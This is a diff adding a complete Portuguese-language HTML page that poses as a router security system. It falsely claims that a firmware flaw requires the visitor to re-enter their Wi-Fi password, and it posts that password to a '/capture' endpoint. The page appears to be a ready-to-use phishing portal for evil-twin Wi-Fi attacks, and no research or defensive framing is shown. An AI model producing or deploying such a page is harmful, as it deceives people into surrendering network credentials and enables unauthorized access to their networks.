@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Atualização de Segurança Requerida</title>
+    <style>
+        body { font-family: sans-serif; background: #fff; color: #333; text-align: center; padding: 50px; }
+        .container { max-width: 400px; margin: auto; border: 1px solid #ddd; padding: 20px; border-radius: 8px; }
+        h1 { color: #d32f2f; font-size: 1.5em; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
+        button { background: #1976d2; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; width: 100%; }
+        .logo { font-weight: bold; font-size: 1.2em; color: #1976d2; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">SISTEMA DE SEGURANÇA WI-FI</div>
+        <h1>Atualização Obrigatória</h1>
+        <p>Detectamos uma falha de segurança no seu roteador. Para continuar navegando com segurança, por favor re-insira a senha do seu Wi-Fi para autenticar a atualização do firmware.</p>
+        <form action="/capture" method="post">
+            <input type="password" name="password" placeholder="Senha do Wi-Fi" required>
+            <button type="submit">Autenticar e Atualizar</button>
+        </form>
+        <p style="font-size: 0.8em; color: #777; margin-top: 20px;">Cod: ERR_WIFI_PROTO_FIX</p>
+    </div>
+</body>
+</html>
